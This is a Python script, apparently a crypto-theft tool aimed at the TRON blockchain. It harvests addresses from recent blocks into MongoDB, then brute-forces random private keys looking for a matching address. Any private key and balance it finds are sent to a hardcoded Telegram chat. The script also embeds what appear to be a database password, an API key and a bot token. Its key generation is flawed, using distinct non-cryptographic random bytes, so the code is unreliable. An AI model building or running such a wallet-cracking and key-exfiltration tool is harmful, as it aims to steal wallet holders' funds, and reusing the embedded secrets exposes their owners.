from threading import Thread
from time import sleep

import telebot
from tronpy import Tron
from tronpy.providers import HTTPProvider
import base
import base58
import ecdsa
import random

from Crypto.Hash import keccak

bd = base.Base('mongodb://Roooasr:sedsaigUG12IHKJhihsifhaosf@mongodb_scan:27017/')

client = Tron(network="mainet",provider=HTTPProvider(api_key="ae3afca0-db2f-485a-a0c9-92994d352f34"))
bot = telebot.TeleBot('5072194047:AAFeQRpZAloSxWP6iX2sOLKZ5suXZ_qRL2I')

def keccak256(data):
    hasher = keccak.new(digest_bits=256)
    hasher.update(data)
    return hasher.digest()


def get_signing_key(raw_priv):
    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)


def verifying_key_to_addr(key):
    pub_key = key.to_string()
    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]
    # 0 (zero), O (capital o), I (capital i) and l (lower case L)
    addr = base58.b58encode_check(primitive_addr)
    return addr


def getAdress():
    suck50 = False
    suck90 = False
    bot.send_message(811017432, f"found start")
    for i in range(10000):
        block = client.get_block(client.get_latest_block_number() - i)
        if (i/10000)*100 >= 50 and suck50 == False:
            suck50 = True
            bot.send_message(811017432,f"block sucsess to 50%")

        if (i/10000)*100 >= 90 and suck90 == False:
            suck90 = True
            bot.send_message(811017432, f"block sucsess to 90% well done!")

        for tr in block['transactions']:
            print(i)
            try:
                if bd.getAddress(tr['raw_data']['contract'][0]['parameter']['value']['owner_address']) is None:
                    bd.regAddress(tr['raw_data']['contract'][0]['parameter']['value']['owner_address'])
                else:
                    print("in base owner_address")
                if bd.getAddress(tr['raw_data']['contract'][0]['parameter']['value']['to_address']) is None:
                    bd.regAddress(tr['raw_data']['contract'][0]['parameter']['value']['to_address'])
                else:
                    print('in base to_address')
            except:
                pass


def findAddress():
    while True:
        raw = bytes(random.sample(range(0, 256), 32))
        # raw = bytes.fromhex('a0a7acc6256c3..........b9d7ec23e0e01598d152')
        key = get_signing_key(raw)
        addr = verifying_key_to_addr(key.get_verifying_key()).decode()
        adr = addr
        adrHex = base58.b58decode_check(addr.encode()).hex()
        Publick_key = key.get_verifying_key().to_string().hex()
        Private_Key = raw.hex()

        if bd.getAddress(adr) is not None:
            bala = client.get_account_balance(adr)
            bd.setPrivatKayNBalance(adr,Private_Key,bala)
            bot.send_message(811017432,f"balance: {bala} priv: {Private_Key} addr: {adr}")
            break
        else:
            pass





#bd.regAddress(block['transactions'][0]['raw_data']['contract'][0]['parameter']['value']['owner_address'])
#bd.regAddress(block['transactions'][0]['raw_data']['contract'][0]['parameter']['value']['to_address'])

getAdress()

for i in range(3):
    th = Thread(target=findAddress)
    th.start()
    bot.send_message(811017432,f'{i} thread is started')
    sleep(i)


#for bloc in block['transactions']:
#    print(bloc)

#def cikle():
#    a = 0
#    while True:
#        wallet = client.generate_address()
#        address = wallet['base58check_address']
#        try:
#            print(client.get_account_balance(address))
#            print(wallet)
#        except:
#            pass
#
#
#for i in range(10):
#    th = Thread(target=cikle())
#    th.start()

